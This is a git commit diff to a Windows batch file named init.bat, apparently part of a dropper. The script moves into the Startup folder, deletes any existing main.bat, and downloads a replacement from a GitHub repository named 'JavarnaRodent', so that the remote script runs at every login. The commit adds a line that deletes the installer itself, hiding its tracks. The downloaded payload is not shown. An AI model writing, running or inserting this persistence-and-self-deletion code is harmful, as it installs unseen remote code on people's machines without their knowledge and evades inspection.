46b52db0e8c82b399afd8ebe81f26a837ab32f82
JavarnaHordy <150206664+JavarnaHordy@users.noreply.github.com>
2023-11-07 20:53:46 -0500

    Update init.bat

--- init.bat
+++ init.bat
@@ -1,3 +1,4 @@
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 del main.bat 2>null
 curl -o main.bat https://raw.githubusercontent.com/JavarnaHordy/JavarnaRodent/main/main.bat
+del %0
